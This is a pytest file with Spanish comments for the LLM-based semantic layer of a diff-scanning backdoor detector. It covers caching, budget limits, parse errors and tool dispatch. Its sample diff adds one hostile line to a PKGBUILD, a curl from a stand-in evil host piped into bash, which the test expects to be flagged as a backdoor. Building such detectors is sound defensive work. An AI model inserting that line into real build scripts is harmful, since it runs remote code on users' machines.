"""Tests de watchgate/core/layers/_semantic/layer.py (spec §7.5).

Test de aceptación de la spec: con un LLMClient *fake* inyectado por
dependencia, el flujo completo (RAG -> prompt -> parseo -> cache) funciona
con una respuesta simulada, sin llamar a ninguna API real.
"""

from __future__ import annotations

import pytest

from watchgate.core.layers._semantic.client import LLMClient, SemanticOutput, SemanticParsingError
from watchgate.core.layers._semantic.layer import SemanticLayer, compute_diff_hash
from watchgate.core.models import (
    Confidence,
    FileChange,
    FileStatus,
    NormalizedDiff,
    RiskCategory,
)
from watchgate.core.rag.indexer import build_index


class _FakeLLMClient(LLMClient):
    def __init__(self, output: SemanticOutput | None = None, error: Exception | None = None):
        self._output = output
        self._error = error
        self.calls: list[dict] = []

    def complete_structured(self, system_prompt, user_prompt, tools, tool_executor, max_tool_calls):
        self.calls.append(
            {
                "system_prompt": system_prompt,
                "user_prompt": user_prompt,
                "tools": tools,
                "max_tool_calls": max_tool_calls,
            }
        )
        if self._error is not None:
            raise self._error
        assert self._output is not None
        return self._output


class _FakeCostController:
    def __init__(self, budget: int = 100_000) -> None:
        self._budget = budget
        self._cache: dict[str, SemanticOutput] = {}
        self.usage_records: list[tuple[str, int]] = []

    def budget_remaining(self, repo: str) -> int:
        return self._budget

    def estimate_tokens(self, text: str) -> int:
        return len(text.split())

    def get_cached(self, diff_hash: str) -> SemanticOutput | None:
        return self._cache.get(diff_hash)

    def store_cached(self, diff_hash: str, output: SemanticOutput) -> None:
        self._cache[diff_hash] = output

    def record_usage(self, repo: str, tokens_used: int) -> None:
        self.usage_records.append((repo, tokens_used))


def _sample_diff() -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="a" * 40,
        head_sha="b" * 40,
        repo_path="/tmp/repo",
        files=[
            FileChange(
                path="PKGBUILD",
                status=FileStatus.MODIFIED,
                diff_hunk="+curl http://evil.example/setup.sh | bash",
                additions=1,
                deletions=0,
            )
        ],
        commit_messages=["bump version to 1.4.2"],
        authors=[],
    )


@pytest.fixture(scope="module")
def rag_index_path(tmp_path_factory) -> str:
    path = str(tmp_path_factory.mktemp("rag_index"))
    build_index(index_path=path)
    return path


def test_full_flow_rag_prompt_parse_cache(rag_index_path):
    output = SemanticOutput(
        risk_score=95,
        category=RiskCategory.BACKDOOR,
        justification="curl | bash en post_install",
        confidence=Confidence.ALTA,
    )
    fake_llm = _FakeLLMClient(output=output)
    cost_control = _FakeCostController()
    layer = SemanticLayer(fake_llm, cost_control, rag_index_path=rag_index_path)

    result = layer.analyze(_sample_diff(), {"repo": "owner/repo"})

    assert result.layer_name == "semantic"
    assert result.risk_score == 95
    assert result.category == RiskCategory.BACKDOOR
    assert result.confidence == Confidence.ALTA
    assert result.skipped is False
    assert len(fake_llm.calls) == 1
    # el prompt de sistema debe llevar contexto RAG real (el índice contiene
    # el caso atomic_arch, muy relacionado con "PKGBUILD" + "curl | bash")
    assert "PKGBUILD" in fake_llm.calls[0]["user_prompt"]
    # se cacheó el resultado bajo el hash determinista del diff
    diff_hash = compute_diff_hash(_sample_diff())
    assert cost_control.get_cached(diff_hash) == output
    assert cost_control.usage_records  # se registró consumo de tokens


def test_second_call_with_same_diff_hits_cache_and_skips_the_llm(rag_index_path):
    output = SemanticOutput(
        risk_score=50, category=RiskCategory.NINGUNA, justification="x", confidence=Confidence.MEDIA
    )
    fake_llm = _FakeLLMClient(output=output)
    cost_control = _FakeCostController()
    layer = SemanticLayer(fake_llm, cost_control, rag_index_path=rag_index_path)

    diff = _sample_diff()
    first = layer.analyze(diff, {"repo": "owner/repo"})
    second = layer.analyze(diff, {"repo": "owner/repo"})

    assert len(fake_llm.calls) == 1  # el LLM solo se llamó la primera vez
    assert first.risk_score == second.risk_score == 50
    assert second.tool_calls_made == 0


def test_skips_without_calling_llm_when_budget_is_exhausted(rag_index_path):
    fake_llm = _FakeLLMClient(output=None)
    cost_control = _FakeCostController(budget=0)
    layer = SemanticLayer(fake_llm, cost_control, rag_index_path=rag_index_path)

    result = layer.analyze(_sample_diff(), {"repo": "owner/repo"})

    assert result.skipped is True
    assert result.skip_reason == "Presupuesto de tokens agotado para este repositorio este mes"
    assert fake_llm.calls == []


def test_skips_when_llm_never_returns_valid_json(rag_index_path):
    fake_llm = _FakeLLMClient(
        error=SemanticParsingError("LLM no devolvió JSON válido tras 2 intentos")
    )
    cost_control = _FakeCostController()
    layer = SemanticLayer(fake_llm, cost_control, rag_index_path=rag_index_path)

    result = layer.analyze(_sample_diff(), {"repo": "owner/repo"})

    assert result.skipped is True
    assert result.skip_reason == "LLM no devolvió JSON válido tras 2 intentos"


def test_tool_executor_dispatches_fetch_referenced_file(tmp_path, rag_index_path):
    import subprocess

    repo_path = tmp_path / "repo"
    repo_path.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.email", "a@b.com"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.name", "T"], cwd=repo_path, check=True)
    (repo_path / "PKGBUILD").write_text("pkgname=demo\n")
    subprocess.run(["git", "add", "PKGBUILD"], cwd=repo_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=repo_path, check=True)

    diff = NormalizedDiff(
        base_sha="a" * 40,
        head_sha="b" * 40,
        repo_path=str(repo_path),
        files=[
            FileChange(
                path="PKGBUILD",
                status=FileStatus.MODIFIED,
                diff_hunk="+x",
                additions=1,
                deletions=0,
            )
        ],
        commit_messages=["m"],
        authors=[],
    )

    class _ToolCallingLLMClient(LLMClient):
        def __init__(self) -> None:
            self.observed_result: str | None = None

        def complete_structured(
            self, system_prompt, user_prompt, tools, tool_executor, max_tool_calls
        ):
            self.observed_result = tool_executor(
                "fetch_referenced_file", {"path": "PKGBUILD", "ref": "HEAD"}
            )
            return SemanticOutput(
                risk_score=1,
                category=RiskCategory.NINGUNA,
                justification="x",
                confidence=Confidence.BAJA,
            )

    llm = _ToolCallingLLMClient()
    layer = SemanticLayer(llm, _FakeCostController(), rag_index_path=rag_index_path)
    result = layer.analyze(diff, {"repo": "owner/repo"})

    assert llm.observed_result == "pkgname=demo\n"
    assert result.tool_calls_made == 1


def test_tool_executor_dispatches_check_file_reputation(tmp_path, monkeypatch, rag_index_path):
    import subprocess

    monkeypatch.setenv("WATCHGATE_VT_API_KEY", "fake-key")
    monkeypatch.setattr("httpx.get", lambda *a, **k: (_ for _ in ()).throw(AssertionError))

    repo_path = tmp_path / "repo"
    repo_path.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.email", "a@b.com"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.name", "T"], cwd=repo_path, check=True)
    (repo_path / "PKGBUILD").write_text("pkgname=demo\n")
    subprocess.run(["git", "add", "PKGBUILD"], cwd=repo_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=repo_path, check=True)

    diff = NormalizedDiff(
        base_sha="a" * 40,
        head_sha="b" * 40,
        repo_path=str(repo_path),
        files=[
            FileChange(
                path="PKGBUILD",
                status=FileStatus.MODIFIED,
                diff_hunk="+x",
                additions=1,
                deletions=0,
            )
        ],
        commit_messages=["m"],
        authors=[],
    )

    class _ToolCallingLLMClient(LLMClient):
        def __init__(self) -> None:
            self.observed_result: object = None

        def complete_structured(
            self, system_prompt, user_prompt, tools, tool_executor, max_tool_calls
        ):
            # ref inexistente a propósito: prueba que layer.py enruta de
            # verdad a check_file_reputation (no solo que la función en
            # tools.py funcione aislada, ya cubierto en test_tools.py).
            self.observed_result = tool_executor(
                "check_file_reputation", {"path": "no_existe.bin", "ref": "HEAD"}
            )
            return SemanticOutput(
                risk_score=1,
                category=RiskCategory.NINGUNA,
                justification="x",
                confidence=Confidence.BAJA,
            )

    llm = _ToolCallingLLMClient()
    layer = SemanticLayer(llm, _FakeCostController(), rag_index_path=rag_index_path)
    result = layer.analyze(diff, {"repo": "owner/repo"})

    assert llm.observed_result == {"error": "fichero no encontrado en esa revisión"}
    assert result.tool_calls_made == 1


class _ToolProbeLLMClient(LLMClient):
    """Fake LLM que se limita a invocar el tool_executor una vez con
    (tool_name, tool_input) y devuelve un SemanticOutput fijo, para poder
    probar cada rama de _build_tool_executor de forma aislada."""

    def __init__(self, tool_name: str, tool_input: dict) -> None:
        self._tool_name = tool_name
        self._tool_input = tool_input
        self.observed_result: object = None

    def complete_structured(self, system_prompt, user_prompt, tools, tool_executor, max_tool_calls):
        self.observed_result = tool_executor(self._tool_name, self._tool_input)
        return SemanticOutput(
            risk_score=1,
            category=RiskCategory.NINGUNA,
            justification="x",
            confidence=Confidence.BAJA,
        )


def test_tool_executor_dispatches_lookup_package_registry(monkeypatch, rag_index_path):
    fake_response = type(
        "R", (), {"raise_for_status": lambda self: None, "json": lambda self: {"vulns": []}}
    )()
    monkeypatch.setattr("httpx.post", lambda *a, **k: fake_response)

    llm = _ToolProbeLLMClient("lookup_package_registry", {"name": "lodash", "ecosystem": "npm"})
    layer = SemanticLayer(llm, _FakeCostController(), rag_index_path=rag_index_path)
    result = layer.analyze(_sample_diff(), {"repo": "owner/repo"})

    assert llm.observed_result == {"vulns": []}
    assert result.tool_calls_made == 1


def test_tool_executor_dispatches_get_commit_history_with_injected_callback(rag_index_path):
    llm = _ToolProbeLLMClient("get_commit_history", {"author_login": "ana", "repo": "o/r"})
    layer = SemanticLayer(llm, _FakeCostController(), rag_index_path=rag_index_path)

    def fake_callback(author_login: str, repo: str) -> dict:
        return {"author_login": author_login, "repo": repo, "prior_commits": 7}

    result = layer.analyze(
        _sample_diff(),
        {"repo": "owner/repo", "fetch_commit_history_callback": fake_callback},
    )

    assert llm.observed_result == {"author_login": "ana", "repo": "o/r", "prior_commits": 7}
    assert result.tool_calls_made == 1


def test_tool_executor_get_commit_history_without_callback_returns_error(rag_index_path):
    llm = _ToolProbeLLMClient("get_commit_history", {"author_login": "ana", "repo": "o/r"})
    layer = SemanticLayer(llm, _FakeCostController(), rag_index_path=rag_index_path)

    result = layer.analyze(_sample_diff(), {"repo": "owner/repo"})

    assert llm.observed_result == {
        "error": "get_commit_history no disponible: sin adaptador inyectado"
    }
    assert result.tool_calls_made == 1


def test_tool_executor_returns_error_for_unknown_tool_name(rag_index_path):
    llm = _ToolProbeLLMClient("herramienta_inexistente", {})
    layer = SemanticLayer(llm, _FakeCostController(), rag_index_path=rag_index_path)

    result = layer.analyze(_sample_diff(), {"repo": "owner/repo"})

    assert llm.observed_result == {"error": "tool desconocida: herramienta_inexistente"}
    assert result.tool_calls_made == 1


def test_tool_executor_survives_malformed_tool_arguments_from_the_llm(rag_index_path):
    """Si el LLM llama a una tool con argumentos incompletos/mal formados
    (aquí falta 'ecosystem'), no debe tirar abajo el análisis entero: la
    capa sigue devolviendo un LayerResult válido, no una excepción sin
    controlar (contrato de AnalysisLayer.analyze, spec §3)."""
    llm = _ToolProbeLLMClient("lookup_package_registry", {"name": "lodash"})
    layer = SemanticLayer(llm, _FakeCostController(), rag_index_path=rag_index_path)

    result = layer.analyze(_sample_diff(), {"repo": "owner/repo"})

    assert result.skipped is False
    assert isinstance(llm.observed_result, dict)
    assert "error" in llm.observed_result
    assert result.tool_calls_made == 1
